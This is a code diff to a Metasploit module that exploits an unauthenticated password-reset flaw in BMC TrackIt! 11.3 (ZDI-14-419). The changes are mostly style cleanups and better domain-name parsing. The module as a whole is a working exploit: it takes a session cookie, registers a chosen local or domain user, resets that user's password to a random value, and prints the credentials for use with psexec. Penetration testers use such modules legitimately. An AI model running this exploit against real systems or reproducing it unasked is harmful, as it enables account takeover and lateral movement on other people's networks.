@@ -6,18 +6,18 @@
 require 'msf/core'
 
 class Metasploit4 < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
+    super(update_info(
+      info,
       'Name'           => 'BMC TrackIt! Unauthenticated Arbitrary Local User Password Change',
-      'Description'    => %q{
+      'Description'    => %q(
       This module exploits a flaw in the password reset mechanism in BMC TrackIt! 11.3
       and possibly prior versions.
-      },
+      ),
       'References'     =>
         [
           ['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-14-419/'],
@@ -25,7 +25,7 @@ class Metasploit4 < Msf::Auxiliary
         ],
       'Author'         =>
         [
-          'bperry', #discovery/metasploit module
+          'bperry', # discovery/metasploit module
         ],
       'License'        => MSF_LICENSE,
       'DisclosureDate' => "Dec 9 2014"
@@ -43,9 +43,15 @@ class Metasploit4 < Msf::Auxiliary
     datastore['LOCALUSER']
   end
 
-  def run_host(ip)
+  def run_host(_ip)
+    if datastore['DOMAIN'].blank?
+      vprint_status("#{peer}: retrieving session cookie and domain name")
+    else
+      vprint_status("#{peer}: retrieving domain name")
+    end
+
     res = send_request_cgi(
-      'uri' => normalize_uri(target_uri.path, 'PasswordReset'),
+      'uri' => normalize_uri(target_uri.path, 'PasswordReset')
     )
 
     unless res
@@ -54,9 +60,19 @@ class Metasploit4 < Msf::Auxiliary
     end
 
     cookies = res.get_cookies
-    domain = $1 if res.body =~ /"domainName":"(.*)"\}\);/
-    domain = datastore['DOMAIN'] if datastore['DOMAIN'] != ''
+    if datastore['DOMAIN'].blank?
+      if res.body =~ /"domainName":"([^"]*)"/
+        domain = Regexp.last_match(1)
+        vprint_status("#{peer}: found domain name: #{domain}")
+      else
+        print_error("#{peer}: unable to obtain domain name.  Try specifying DOMAIN")
+        return
+      end
+    else
+      domain = datastore['DOMAIN']
+    end
 
+    vprint_status("#{peer}: sending password reset request for #{domain}\\#{localuser}")
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'Register'),
       'method' => 'POST',
@@ -77,13 +93,13 @@ class Metasploit4 < Msf::Auxiliary
     )
 
     if !res || res.body != "{\"success\":true,\"data\":{\"userUpdated\":true}}"
-      print_error("#{peer}: Could not register the #{localuser} user")
+      print_error("#{peer}: Could not reset password for #{domain}\\#{localuser}")
       return
     end
 
     password = Rex::Text.rand_text_alpha(10) + "!1"
 
-    res = send_request_cgi({
+    res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'PasswordReset', 'Application', 'ResetPassword'),
       'method' => 'POST',
       'cookie' => cookies,
@@ -93,13 +109,13 @@ class Metasploit4 < Msf::Auxiliary
         'UserName' => localuser,
         'CkbResetpassword' => 'true'
       }
-    })
+    )
 
     if !res || res.body != '{"success":true,"data":{"PasswordResetStatus":0}}'
-      print_error("#{peer}: Could not change #{localuser}'s password -- is it a domain or local user?")
+      print_error("#{peer}: Could not change #{domain}\\#{localuser}'s password -- is it a domain or local user?")
       return
     end
 
-    print_good("#{peer} Please run the psexec module using #{domain}\\#{localuser}:#{password}")
+    print_good("#{peer}: Please run the psexec module using #{domain}\\#{localuser}:#{password}")
   end
 end
